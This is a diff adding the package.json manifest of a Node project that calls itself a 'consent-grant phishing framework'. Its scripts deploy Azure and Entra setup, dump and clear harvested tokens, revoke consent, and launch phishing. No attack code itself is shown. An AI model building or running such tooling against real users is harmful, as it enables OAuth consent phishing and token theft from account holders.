@@ -1,0 +1,41 @@
+{
+  "name": "awful-0auth",
+  "version": "0.1.0",
+  "description": "Consent-grant phishing framwork",
+  "private": true,
+  "engines": {
+    "node": ">=20"
+  },
+  "scripts": {
+    "dev": "vercel dev",
+    "deploy": "bash src/scripts/az-setup.sh && bash scr/scripts/entra-setup.sh && node src/scripts/sync-env.js && vercel deploy --prod",
+    "logs": "vercel logs",
+    "test": "node --test src/test/",
+    "db:dump": "node src/scripts/dump-tokens.js",
+    "consent:revoke": "node src/scripts/revoke-consent.js",
+    "db:clear": "node src/scripts/clear-tokens.js",
+    "go:phish": "bash src/scripts/phish.sh --e"
+  },
+  "dependencies": {
+    "@upstash/redis": "^1.34.0",
+    "express": "^4.21.0",
+    "helmet": "^8.0.0",
+    "jose": "^5.9.0",
+    "pino": "^9.4.0",
+    "pino-http": "^10.3.0",
+    "zod": "^3.23.8"
+  },
+  "devDependencies": {
+    "@eslint/js": "^9.11.0",
+    "eslint": "^9.11.0",
+    "eslint-config-prettier": "^9.1.0",
+    "pino-pretty": "^11.2.2",
+    "prettier": "^3.3.3",
+    "supertest": "^7.0.0",
+    "undici": "^6.19.8",
+    "vercel": "^53.1.1"
+  },
+  "main": "eslint.config.js",
+  "author": "",
+  "license": "ISC"
+}
